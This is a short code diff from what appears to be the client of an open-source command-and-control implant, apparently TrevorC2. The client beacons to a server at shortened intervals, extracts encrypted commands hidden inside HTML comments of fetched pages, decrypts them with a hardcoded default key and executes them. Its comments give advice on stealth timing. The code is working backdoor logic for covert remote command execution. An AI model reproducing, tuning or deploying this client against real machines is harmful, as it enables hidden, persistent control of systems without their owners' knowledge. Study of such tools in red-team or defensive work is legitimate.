@@ -26,8 +26,8 @@ QUERY_STRING = ("guid=")
 STUB = ("oldcss=")
 
 # time_interval is the time used between randomly connecting back to server, for more stealth, increase this time a lot and randomize time periods
-time_interval1 = 3
-time_interval2 = 8
+time_interval1 = 1
+time_interval2 = 3
 
 # THIS IS OUR ENCRYPTION KEY - THIS NEEDS TO BE THE SAME ON BOTH SERVER AND CLIENT FOR APPROPRIATE DECRYPTION. RECOMMEND CHANGING THIS FROM THE DEFAULT KEY
 CIPHER = ("Tr3v0rC2R0x@nd1s@w350m3#TrevorForget")
@@ -99,7 +99,6 @@ while 1:
         # <!-- PARAM=bm90aGluZw== --></body> -  What we split on here on encoded site
         parse = html.split("<!-- %s" % (STUB))[1].split("-->")[0]
         parse = cipher.decrypt(parse.decode())
-        #parse = base64.b64decode(parse)
         if parse == "nothing": pass
         else:
             # execute our parsed command
